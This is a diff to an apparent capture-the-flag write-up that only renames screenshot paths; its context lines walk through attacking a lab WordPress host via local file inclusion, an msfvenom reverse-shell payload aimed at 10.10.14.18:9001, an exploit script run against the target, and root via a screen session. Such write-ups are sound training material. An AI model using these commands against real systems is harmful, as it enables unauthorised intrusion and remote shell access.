@@ -68,7 +68,7 @@ We get back the following information:
 
 Visiting the site we can see it is running wordpress
 
-![](<../../../.gitbook/assets/image (20).png>)
+![](<../../../.gitbook/assets/image (20) (1).png>)
 
 Also hovering over a link gives us the hostname to put in our hosts file
 
@@ -224,7 +224,7 @@ Going to that url in the poc we get prompted to download what looks to be the co
 
 ![](<../../../.gitbook/assets/image (11).png>)
 
-![](<../../../.gitbook/assets/image (26).png>)
+![](<../../../.gitbook/assets/image (26) (1).png>)
 
 Looks like we have an [LFI](https://en.wikipedia.org/wiki/File\_inclusion\_vulnerability) vulnerability (Local File Inclusion)
 
@@ -367,7 +367,7 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.18 LPORT=9001 PrependFork
 
 I had to first update my local host (LHOST) and I changed the port to 9001
 
-![Reverse Shell Created](<../../../.gitbook/assets/image (23).png>)
+![Reverse Shell Created](<../../../.gitbook/assets/image (23) (1).png>)
 
 Next we need to set up a netcat listener to listen out on port 9001
 
@@ -381,11 +381,11 @@ Next we need to run the exploit against the target machine and try and catch the
 python3 50539.py 10.129.133.133:1337 rev.bin
 ```
 
-![Pwned!!](<../../../.gitbook/assets/image (24).png>)
+![Pwned!!](<../../../.gitbook/assets/image (24) (1).png>)
 
 And we got a reverse shell!
 
-![Shell Captured](<../../../.gitbook/assets/image (15).png>)
+![Shell Captured](<../../../.gitbook/assets/image (15) (1).png>)
 
 Time to upgrade the shell with python
 
@@ -415,7 +415,7 @@ Earlier we saw that screen was running as the root user so maybe there is a vuln
 
 It also turns out that we can resume the root user screen session with `screen -r root/`
 
-![I am root!](<../../../.gitbook/assets/image (13).png>)
+![I am root!](<../../../.gitbook/assets/image (13) (1).png>)
 
 And now we find root.txt
 
